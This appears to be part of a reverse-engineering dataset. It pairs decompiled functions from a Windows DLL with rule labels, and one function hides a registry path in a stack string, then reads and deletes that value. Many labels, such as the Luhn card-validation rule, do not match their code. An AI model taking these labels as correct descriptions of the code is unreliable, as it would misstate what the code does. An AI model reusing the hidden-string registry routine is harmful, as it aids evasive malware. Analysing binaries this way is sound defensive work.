        "decompiled_code": "\nvoid fcn.1800139cc(int64_t *arg1)\n\n{\n    if (arg1 != NULL) {\n        if (*arg1 != *0x18001c340) {\n            fcn.18000a06c(*arg1);\n        }\n        if (arg1[1] != *0x18001c348) {\n            fcn.18000a06c(arg1[1]);\n        }\n        if (arg1[2] != *0x18001c350) {\n            fcn.18000a06c(arg1[2]);\n        }\n        if (arg1[0xb] != *0x18001c398) {\n            fcn.18000a06c(arg1[0xb]);\n        }\n        if (arg1[0xc] != *0x18001c3a0) {\n            fcn.18000a06c(arg1[0xc]);\n        }\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "1800153f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t fcn.1800153fc(uint16_t *arg1, uint16_t *arg2)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint16_t uVar4;\n    int64_t iVar5;\n    int64_t aiStack40 [2];\n    int64_t iStack24;\n    char cStack16;\n    \n    if (*0x18001d0d8 == 0) {\n        if ((arg1 != NULL) && (arg2 != NULL)) {\n            iVar5 = arg1 - arg2;\n            do {\n                uVar1 = *(iVar5 + arg2);\n                if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                    uVar1 = uVar1 + 0x20;\n                }\n                uVar4 = *arg2;\n                if ((0x40 < uVar4) && (uVar4 < 0x5b)) {\n                    uVar4 = uVar4 + 0x20;\n                }\n                arg2 = arg2 + 1;\n            } while ((uVar1 != 0) && (uVar1 == uVar4));\n            return uVar1 - uVar4;\n        }\n        puVar3 = fcn.18000c4c4();\n        *puVar3 = 0x16;\n        fcn.18000c45c();\n        return 0x7fffffff;\n    }\n    fcn.18000b618(aiStack40, 0);\n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar3 = fcn.18000c4c4();\n        *puVar3 = 0x16;\n        fcn.18000c45c();\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n        iVar2 = 0x7fffffff;\n    }\n    else {\n        if (*(aiStack40[0] + 0x14) == 0) {\n            iVar5 = arg1 - arg2;\n            do {\n                uVar1 = *(iVar5 + arg2);\n                if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                    uVar1 = uVar1 + 0x20;\n                }\n                uVar4 = *arg2;\n                if ((0x40 < uVar4) && (uVar4 < 0x5b)) {\n                    uVar4 = uVar4 + 0x20;\n                }\n                arg2 = arg2 + 1;\n            } while ((uVar1 != 0) && (uVar1 == uVar4));\n        }\n        else {\n            do {\n                uVar1 = fcn.180015484(*arg1, aiStack40);\n                arg1 = arg1 + 1;\n                uVar4 = fcn.180015484(*arg2, aiStack40);\n                arg2 = arg2 + 1;\n                if (uVar1 == 0) break;\n            } while (uVar1 == uVar4);\n        }\n        iVar2 = uVar1 - uVar4;\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 756
    },
    "1800010d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800010d0(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int64_t arg1_00;\n    int64_t iVar2;\n    uint32_t *in_stack_00000028;\n    uint32_t uStack40;\n    \n    uVar1 = fcn.180001250(arg1, arg3);\n    *in_stack_00000028 = uVar1;\n    arg1_00 = fcn.1800011d0(arg1, arg2, arg3, *in_stack_00000028);\n    iVar2 = fcn.18000a008(*in_stack_00000028);\n    for (uStack40 = 0; uStack40 < *in_stack_00000028; uStack40 = uStack40 + *(arg1 + 0xc)) {\n        fcn.1800012b0(arg1, arg1_00 + uStack40, iVar2 + uStack40, arg4);\n    }\n    fcn.18000a028(arg1_00);\n    return iVar2;\n}\n",
        "token_count": 247
    },
    "1800011d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.1800011d0(ulong arg1, uchar *arg2, ulong arg3, ulong arg4)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uchar *puVar3;\n    \n    puVar1 = fcn.18000a008(arg4);\n    puVar3 = puVar1;\n    for (uVar2 = arg3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar3 = *arg2;\n        arg2 = arg2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = puVar1 + arg3;\n    for (uVar2 = arg4 - arg3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    return puVar1;\n}\n",
        "token_count": 214
    },
    "18000125": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.180001250(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uStack24;\n    \n    uStack24 = arg2 / *(arg1 + 0xc);\n    if (arg2 % *(arg1 + 0xc) != 0) {\n        uStack24 = uStack24 + 1;\n    }\n    return uStack24 * *(arg1 + 0xc);\n}\n",
        "token_count": 94
    },
    "1800012b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800012b0(int32_t *arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    int64_t arg3_00;\n    int64_t *arg2_00;\n    int64_t iVar1;\n    int32_t iStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    \n    arg3_00 = fcn.18000a008(*arg1 * 4 * (arg1[2] + 1));\n    fcn.180001d70(arg1, arg4, arg3_00);\n    arg2_00 = fcn.18000a008(0x20);\n    iVar1 = fcn.18000a008(*arg1 << 2);\n    *arg2_00 = iVar1;\n    for (iStack76 = 0; iStack76 < 4; iStack76 = iStack76 + 1) {\n        arg2_00[iStack76] = *arg1 * iStack76 + *arg2_00;\n    }\n    for (iStack76 = 0; iStack76 < 4; iStack76 = iStack76 + 1) {\n        for (iStack72 = 0; iStack72 < *arg1; iStack72 = iStack72 + 1) {\n            *(iStack72 + arg2_00[iStack76]) = *(arg2 + (iStack76 + iStack72 * 4));\n        }\n    }\n    fcn.180001b00(arg1, arg2_00, arg3_00);\n    for (iStack80 = 1; iStack80 <= arg1[2] + -1; iStack80 = iStack80 + 1) {\n        fcn.1800015e0(arg1, arg2_00);\n        fcn.180001780(arg1, arg2_00);\n        fcn.180001910(arg1, arg2_00);\n        fcn.180001b00(arg1, arg2_00, arg3_00 + iStack80 * 4 * *arg1);\n    }\n    fcn.1800015e0(arg1, arg2_00);\n    fcn.180001780(arg1, arg2_00);\n    fcn.180001b00(arg1, arg2_00, arg3_00 + arg1[2] * 4 * *arg1);\n    for (iStack76 = 0; iStack76 < 4; iStack76 = iStack76 + 1) {\n        for (iStack72 = 0; iStack72 < *arg1; iStack72 = iStack72 + 1) {\n            *(arg3 + (iStack76 + iStack72 * 4)) = *(iStack72 + arg2_00[iStack76]);\n        }\n    }\n    fcn.18000a028(*arg2_00);\n    fcn.18000a028(arg2_00);\n    fcn.18000a028(arg3_00);\n    return;\n}\n",
        "token_count": 670
    },
    "1800015e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.1800015e0(int32_t *arg1, int64_t arg2)\n\n{\n    int32_t iStack40;\n    int32_t iStack32;\n    \n    for (iStack40 = 0; iStack40 < 4; iStack40 = iStack40 + 1) {\n        for (iStack32 = 0; iStack32 < *arg1; iStack32 = iStack32 + 1) {\n            *(iStack32 + *(arg2 + iStack40 * 8)) = str.cw[*(iStack32 + *(arg2 + iStack40 * 8)) & 0xf];\n        }\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "1800016b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800016b0(int32_t *arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uchar uVar1;\n    int32_t iStack24;\n    int32_t iStack16;\n    \n    for (iStack24 = 0; iStack24 < arg4; iStack24 = iStack24 + 1) {\n        uVar1 = **(arg2 + arg3 * 8);\n        for (iStack16 = 0; iStack16 < *arg1 + -1; iStack16 = iStack16 + 1) {\n            *(iStack16 + *(arg2 + arg3 * 8)) = *(iStack16 + 1 + *(arg2 + arg3 * 8));\n        }\n        *(*arg1 + -1 + *(arg2 + arg3 * 8)) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "18000178": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001780(ulong arg1, ulong arg2)\n\n{\n    fcn.1800016b0(arg1, arg2, 1, 1);\n    fcn.1800016b0(arg1, arg2, 2, 2);\n    fcn.1800016b0(arg1, arg2, 3, 3);\n    return;\n}\n",
        "token_count": 85
    },
    "18000185": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t fcn.180001850(ulong arg1)\n\n{\n    uint8_t in_DL;\n    uint8_t in_R8B;\n    uint8_t uStackX24;\n    int32_t iStack24;\n    uint8_t uStack19;\n    uint8_t uStack18;\n    int32_t iStack16;\n    \n    uStack18 = 0;\n    uStackX24 = in_R8B;\n    for (iStack24 = 0; iStack24 < 8; iStack24 = iStack24 + 1) {\n        if ((uStackX24 & 1) != 0) {\n            uStack19 = in_DL;\n            for (iStack16 = 0; iStack16 < iStack24; iStack16 = iStack16 + 1) {\n                uStack19 = fcn.1800017f0(arg1);\n            }\n            uStack18 = uStack18 ^ uStack19;\n        }\n        uStackX24 = uStackX24 >> 1;\n    }\n    return uStack18;\n}\n",
        "token_count": 232
    },
    "18000191": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001910(int32_t *arg1, int64_t arg2)\n\n{\n    uint8_t uVar1;\n    int32_t iStack56;\n    uint8_t auStack52 [4];\n    uint8_t auStack48 [4];\n    int32_t iStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    \n    for (iStack44 = 0; iStack44 < *arg1; iStack44 = iStack44 + 1) {\n        for (iStack56 = 0; iStack56 < 4; iStack56 = iStack56 + 1) {\n            auStack52[iStack56] = *(iStack44 + *(arg2 + iStack56 * 8));\n        }\n        uVar1 = fcn.180001850(arg1);\n        uStack40 = uVar1;\n        uVar1 = fcn.180001850(arg1);\n        auStack48[0] = uStack40 ^ uVar1 ^ auStack52[2] ^ auStack52[3];\n        uStack36 = auStack52[0];\n        uVar1 = fcn.180001850(arg1);\n        uStack32 = uStack36 ^ uVar1;\n        uVar1 = fcn.180001850(arg1);\n        auStack48[1] = uStack32 ^ uVar1 ^ auStack52[3];\n        uStack28 = auStack52[0] ^ auStack52[1];\n        uVar1 = fcn.180001850(arg1);\n        uStack24 = uStack28 ^ uVar1;\n        auStack48[2] = fcn.180001850(arg1);\n        auStack48[2] = uStack24 ^ auStack48[2];\n        uVar1 = fcn.180001850(arg1);\n        uStack20 = uVar1 ^ auStack52[1] ^ auStack52[2];\n        uVar1 = fcn.180001850(arg1);\n        auStack48[3] = uStack20 ^ uVar1;\n        for (iStack56 = 0; iStack56 < 4; iStack56 = iStack56 + 1) {\n            *(iStack44 + *(arg2 + iStack56 * 8)) = auStack48[iStack56];\n        }\n    }\n    return;\n}\n",
        "token_count": 549
    },
    "180001b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001b00(int32_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    for (iStack24 = 0; iStack24 < 4; iStack24 = iStack24 + 1) {\n        for (iStack20 = 0; iStack20 < *arg1; iStack20 = iStack20 + 1) {\n            *(iStack20 + *(arg2 + iStack24 * 8)) =\n                 *(*(arg2 + iStack24 * 8) + iStack20) ^ *(arg3 + (iStack24 + iStack20 * 4));\n        }\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "180001ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.180001ba0(ulong arg1, int64_t arg2)\n\n{\n    int32_t iStack24;\n    \n    for (iStack24 = 0; iStack24 < 4; iStack24 = iStack24 + 1) {\n        *(arg2 + iStack24) = str.cw[*(arg2 + iStack24) & 0xf];\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "180001c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.180001c30(ulong arg1, uchar *arg2)\n\n{\n    uchar uVar1;\n    \n    uVar1 = *arg2;\n    *arg2 = arg2[1];\n    arg2[1] = arg2[2];\n    arg2[2] = arg2[3];\n    arg2[3] = uVar1;\n    return;\n}\n",
        "token_count": 85
    },
    "180001c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001c90(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t iStack24;\n    \n    for (iStack24 = 0; iStack24 < 4; iStack24 = iStack24 + 1) {\n        *(arg4 + iStack24) = *(arg2 + iStack24) ^ *(arg3 + iStack24);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "180001cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001cf0(ulong arg1, uchar *arg2, ulong arg3)\n\n{\n    int32_t iStack24;\n    uchar uStack20;\n    \n    uStack20 = 1;\n    for (iStack24 = 0; iStack24 < arg3 + -1; iStack24 = iStack24 + 1) {\n        uStack20 = fcn.1800017f0(arg1);\n    }\n    *arg2 = uStack20;\n    arg2[3] = 0;\n    arg2[2] = 0;\n    arg2[1] = 0;\n    return;\n}\n",
        "token_count": 140
    },
    "18000209": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180002090(ulong arg1)\n\n{\n    fcn.18000a48c(arg1);\n    return;\n}\n",
        "token_count": 30
    },
    "1800020b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800020b0(ulong arg1)\n\n{\n    fcn.18000a4d4(arg1);\n    return;\n}\n",
        "token_count": 33
    },
    "18000214": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180002140(ulong arg1)\n\n{\n    int64_t iVar1;\n    uchar *puVar2;\n    ushort uStack456;\n    uchar auStack454 [206];\n    ushort uStack248;\n    ushort uStack246;\n    ushort uStack244;\n    ushort uStack242;\n    ushort uStack240;\n    ushort uStack238;\n    ushort uStack236;\n    ushort uStack234;\n    ushort uStack232;\n    uchar auStack230 [206];\n    uint auStack24 [4];\n    \n    uStack456 = 0;\n    puVar2 = auStack454;\n    for (iVar1 = 0xc6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    uStack232 = 0;\n    puVar2 = auStack230;\n    for (iVar1 = 0xc6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    auStack24[0] = 100;\n    (**0x18001dfc8)(&uStack232, auStack24);\n    auStack24[0] = 100;\n    (**0x18001df10)(&uStack456, auStack24);\n    uStack248 = 0x25;\n    uStack246 = 0x73;\n    uStack244 = 0x5c;\n    uStack242 = 0x25;\n    uStack240 = 0x73;\n    uStack238 = 0xd;\n    uStack236 = 10;\n    uStack234 = 0;\n    fcn.18000a0ac(arg1, &uStack248, &uStack456, &uStack232);\n    return arg1;\n}\n",
        "token_count": 415
    },
    "18000333": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nulong fcn.180003330(ulong arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    int64_t aiStack248 [2];\n    ushort uStack232;\n    uchar auStack230 [206];\n    int64_t iStack24;\n    \n    uStack232 = 0;\n    puVar3 = auStack230;\n    for (iVar2 = 0xc6; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    uVar1 = (**0x18001df48)();\n    iStack24 = fcn.1800020b0(0);\n    aiStack248[0] = iStack24 - uVar1 / 1000;\n    iVar2 = fcn.180002090(aiStack248);\n    fcn.18000a0ac(arg1, 0x1800189b8, *(iVar2 + 0x14) + 0x76c, *(iVar2 + 0x10) + 1);\n    return arg1;\n}\n",
        "token_count": 255
    },
    "18000342": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nulong fcn.180003420(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong auStack16 [2];\n    \n    auStack16[0] = fcn.1800020b0(0);\n    iVar1 = fcn.180002090(auStack16);\n    fcn.18000a0ac(arg1, L\"%d/%02d/%02d %02d:%02d:%02d\\r\\n\", *(iVar1 + 0x14) + 0x76c, *(iVar1 + 0x10) + 1);\n    return arg1;\n}\n",
        "token_count": 132
    },
    "18000641": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006410(code **arg1)\n\n{\n    *arg1 = vtable.std::bad_alloc.0;\n    fcn.18000a7ac(arg1);\n    return;\n}\n",
        "token_count": 44
    },
    "1800064e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800064e0(void)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    ulong arg4;\n    ushort uStack1080;\n    uchar auStack1078 [526];\n    ushort uStack552;\n    uchar auStack550 [526];\n    ulong uStack24;\n    \n    puVar3 = 0x18001e030;\n    for (iVar2 = 0x28; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    uStack552 = 0;\n    puVar3 = auStack550;\n    for (iVar2 = 0x206; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    uStack1080 = 0;\n    puVar3 = auStack1078;\n    for (iVar2 = 0x206; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    uStack24 = fcn.180002140(&uStack1080);\n    uVar1 = fcn.1800020b0(0);\n    arg4 = uStack24;\n    fcn.18000a0ac(&uStack552, L\"%llx%s\", uVar1, uStack24);\n    uVar1 = fcn.180006480(&uStack552);\n    fcn.18000a0ac(0x18001e030, L\"%016llX\", uVar1, arg4);\n    return 0x18001e030;\n}\n",
        "token_count": 399
    },
    "1800066b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800066b0(ulong arg1, ulong arg2)\n\n{\n    fcn.18000ae20(arg1);\n    return;\n}\n",
        "token_count": 35
    },
    "180006ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006ab0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uchar uStack72;\n    uchar uStack71;\n    uchar uStack70;\n    uchar uStack69;\n    uchar uStack68;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    uchar uStack64;\n    uchar uStack63;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack57;\n    uchar uStack56;\n    uchar uStack55;\n    uchar uStack54;\n    uchar uStack53;\n    uchar uStack52;\n    uchar uStack51;\n    uchar uStack50;\n    uchar uStack49;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    uchar uStack45;\n    uchar uStack44;\n    uchar uStack43;\n    uchar uStack42;\n    uchar uStack41;\n    uchar uStack40;\n    uchar uStack39;\n    uchar uStack38;\n    uchar uStack37;\n    uchar uStack36;\n    uchar uStack35;\n    uchar uStack34;\n    uchar uStack33;\n    uchar uStack32;\n    ulong uStack24;\n    uchar auStack16 [4];\n    uint32_t auStack12 [3];\n    \n    uStack64 = 0x53;\n    uStack63 = 0x6f;\n    uStack62 = 0x66;\n    uStack61 = 0x74;\n    uStack60 = 0x77;\n    uStack59 = 0x61;\n    uStack58 = 0x72;\n    uStack57 = 0x65;\n    uStack56 = 0x5c;\n    uStack55 = 0x4d;\n    uStack54 = 0x69;\n    uStack53 = 99;\n    uStack52 = 0x72;\n    uStack51 = 0x6f;\n    uStack50 = 0x73;\n    uStack49 = 0x6f;\n    uStack48 = 0x66;\n    uStack47 = 0x74;\n    uStack46 = 0x5c;\n    uStack45 = 0x41;\n    uStack44 = 99;\n    uStack43 = 99;\n    uStack42 = 0x65;\n    uStack41 = 0x73;\n    uStack40 = 0x73;\n    uStack39 = 0x69;\n    uStack38 = 0x62;\n    uStack37 = 0x69;\n    uStack36 = 0x6c;\n    uStack35 = 0x69;\n    uStack34 = 0x74;\n    uStack33 = 0x79;\n    uStack32 = 0;\n    uStack72 = 0x44;\n    uStack71 = 0x65;\n    uStack70 = 0x73;\n    uStack69 = 0x6b;\n    uStack68 = 0x74;\n    uStack67 = 0x6f;\n    uStack66 = 0x70;\n    uStack65 = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0xffffffff80000001, &uStack64, &uStack24);\n    if ((iVar1 == 0) &&\n       (auStack12[0] = arg2, \n       iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(uStack24, &uStack72, 0, auStack16, arg1, auStack12), \n       iVar1 == 0)) {\n        (*_sym.imp.ADVAPI32.dll_RegDeleteValueA)(uStack24, &uStack72);\n        *(arg1 + auStack12[0]) = 0;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack24);\n    }\n    return;\n}\n",
        "token_count": 878
    },
    "18000a61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000a610(ulong arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *apcStackX16 [3];\n    code *apcStack40 [4];\n    \n    do {\n        iVar3 = fcn.18000ad68(arg1);\n        if (iVar3 != 0) {\n            return;\n        }\n        iVar2 = fcn.18000e3d8(arg1);\n    } while (iVar2 != 0);\n    if ((*0x18001c4e0 & 1) == 0) {\n        *0x18001c4e0 = *0x18001c4e0 | 1;\n        apcStackX16[0] = \"bad allocation\";\n        fcn.18000a6b4(0x18001c4c8, apcStackX16);\n        *0x18001c4c8 = vtable.std::bad_alloc.0;\n        fcn.18000e55c(0x180015854);\n    }\n    fcn.18000a7f8(apcStack40);\n    apcStack40[0] = vtable.std::bad_alloc.0;\n    fcn.18000b170(apcStack40, 0x180019a30);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 312
    },
    "18000a06": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000a06c(int64_t lpMem)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if ((lpMem != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x18001c530, 0, lpMem),  iVar2 == 0)) {\n        puVar1 = fcn.18000c4c4();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar4 = fcn.18000c47c(uVar3);\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "18000e2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000e2d8(uint *arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == NULL) {\n        puVar1 = fcn.18000c4c4();\n        *puVar1 = 0x16;\n        fcn.18000c45c();\n        uVar2 = 0x16;\n    }\n    else {\n        *arg1 = *0x18001b594;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 121
    },
    "18000e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000e308(uint *arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == NULL) {\n        puVar1 = fcn.18000c4c4();\n        *puVar1 = 0x16;\n        fcn.18000c45c();\n        uVar2 = 0x16;\n    }\n    else {\n        *arg1 = *0x18001b598;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 119
    },
    "18000e33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000e338(uint *arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == NULL) {\n        puVar1 = fcn.18000c4c4();\n        *puVar1 = 0x16;\n        fcn.18000c45c();\n        uVar2 = 0x16;\n    }\n    else {\n        *arg1 = *0x18001b590;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 119
    },
    "18000fe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000fe4c(void)\n\n{\n    code **ppcVar1;\n    \n    for (ppcVar1 = 0x180018e28; ppcVar1 < 0x180018e28; ppcVar1 = ppcVar1 + 1) {\n        if (*ppcVar1 != NULL) {\n            (**ppcVar1)();\n        }\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "18000a00": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.18000a008(ulong arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *apcStackX16 [3];\n    code *apcStack40 [4];\n    \n    do {\n        iVar3 = fcn.18000ad68(arg1);\n        if (iVar3 != 0) {\n            return;\n        }\n        iVar2 = fcn.18000e3d8(arg1);\n    } while (iVar2 != 0);\n    if ((*0x18001c4e0 & 1) == 0) {\n        *0x18001c4e0 = *0x18001c4e0 | 1;\n        apcStackX16[0] = \"bad allocation\";\n        fcn.18000a6b4(0x18001c4c8, apcStackX16);\n        *0x18001c4c8 = vtable.std::bad_alloc.0;\n        fcn.18000e55c(0x180015854);\n    }\n    fcn.18000a7f8(apcStack40);\n    apcStack40[0] = vtable.std::bad_alloc.0;\n    fcn.18000b170(apcStack40, 0x180019a30);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 312
    }
}